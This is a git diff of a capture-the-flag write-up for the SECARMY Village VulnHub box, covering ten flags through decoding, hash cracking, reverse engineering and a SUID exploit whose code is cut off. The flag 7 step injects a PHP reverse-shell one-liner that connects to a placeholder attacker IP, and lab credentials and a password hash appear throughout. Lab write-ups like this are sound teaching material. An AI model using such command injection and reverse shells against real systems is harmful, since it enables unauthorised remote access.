@@ -15,6 +15,9 @@ tags:
 author: trollzorftw
 ---
 
+### Context
+This is a writeup for SECARMY's CTF OSCP box. The contest has ended, but you can find the VM on Vulnhub: [Download Page](https://www.vulnhub.com/entry/secarmy-village-grayhat-conference,585/)
+
 
 ### Flag 1
 ```bash
@@ -39,17 +42,22 @@ Giving us the credentials for uno user:
 ### Flag 2
 We read readme.txt and we get: 
 "You surely can guess the username , the password will be: 4b3l4rd0fru705"
+
 We try escalation to dos with password 4b3l4rd0fru705 and we get access
 
 
 After reading readme.txt we run the following command:
+
+
 ```bash
 cd ./files && grep -r a8211ac1853a1235d48829414626512a
+
+file4444.txt:a8211ac1853a1235d48829414626512a
 ```
 
-Result: file4444.txt:a8211ac1853a1235d48829414626512a
 Opening file4444.txt tells us to: Look inside file3131.txt
-Getting a base64 encoded text which decoded gives us a zip file to get flag and the next todo instructions
+
+file3131.txt gives us a base64 encoded text which decoded gives us a zip file to get flag and the next todo instructions:
 
 ```bash
 echo "UEsDBBQDAAAAADOiO1EAAAAAAAAAAAAAAAALAAAAY2hhbGxlbmdlMi9QSwMEFAMAAAgAFZI2Udrg
@@ -68,8 +76,9 @@ AQAAPgEAAAAA" | base64 -d > flag2.zip
 unzip flag2.zip && cat ./challenge2/flag2.txt
 ```
 
+
 ### Flag 3
-We obtain a super secret token from the previous archive and use it on 1337 port
+We obtain a super secret token from the previous archive and use it on 1337 port:
 
 ```bash
 echo "c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b" | nc 192.168.100.33 1337
@@ -84,13 +93,17 @@ Which gives us:
 
 ### Flag 4
 We get a binary which we need to reverse.Using gdb-peda as our reverse tool, we run the binary and close it when it prompts us to enter the key. Because I was unable to breakpoint anywhere in the main function, I tried to find "keywords" that might be in the binary.The command "find 'credentials'" worked and I got:
+
 ```bash
 mapped : 0x7ffff7ffb09b ("credentials for the fourth user cuatro:p3dr00l1v4r3z")
 ```
 
 ### Flag 5
 The todo.txt tells us to go to /justanothergallery on the webserver
+
 After analyzing a little bit we get a bunch of qr images in: http://192.168.100.33/justanothergallery/qr/
+
+
 Downloading them all and decoding the qr codes with a simple python script gives us the next credentials and flag:
 ```python
 from PIL import Image
@@ -117,10 +130,12 @@ Hello and congrats for solving this challenge, we hope that you enjoyed the chal
 
 ### Flag 6
 Reading readme.txt points us to /cincos-secrets/ here we'll get a shadow.bak file but is not readable. Changing the permissions will give us a hash:
+
 ```bash
 chmod 444 shadow.bak && cat shadow.bak | grep seis
+
+seis:$6$MCzqLn0Z2KB3X3TM$opQCwc/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:18532:0:99999:7:::
 ```
-Output: seis:$6$MCzqLn0Z2KB3X3TM$opQCwc/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:18532:0:99999:7:::
 
 Cracking the hash gives us the password: Hogwarts , so creds: seis:Hogwarts
 
@@ -132,6 +147,7 @@ After trying a bit with hydra, having no success because no message on fail. I d
 Adding "php -r '$sock=fsockopen("ATTACKER-IP",LISTEN-PORT);exec("/bin/sh -i <&3 >&3 2>&3");'" in the search bar
 and setting up a netcat reverse shell on LISTEN-PORT on the attacker box we will get www-data shell where we get the seventh user password: 6u1l3rm0p3n473
 
+
 ### Flag 8
 After playing around with the message, I discovered that xoring "x" with every number in message.txt will give us the password. I created a small python script to extract it:
 
@@ -142,8 +158,9 @@ for key in message:
   extracted += chr(ord('x')^key)
 
 print(extracted)
+
+Output:secarmyxoritup
 ```
-Output: secarmyxoritup and get the new password: m0d3570v1ll454n4
 
 
 ### Flag 9
@@ -153,11 +170,14 @@ We obtain a password from the long text: mjwfr?2b6j3a5fx/c .Using dcode.fr and u
 	-QWERTY(US) 
 	-Shift Right + Clockwise rotation
 
-Getting result: 	nueve:355u4z4rc0
+will give us the credentials for the 9th user: 	
+```
+nueve:355u4z4rc0
+```
 
 
 ### Flag 10
-We have a suid set binary, so we will need to exploit it to get root. Reversing it and creating a small python exploit script we get root:
+We have a suid set binary, so we will need to exploit it to get root. Reversing it and creating a small python exploit script will do the trick:
 
 ```python
 from pwn import *
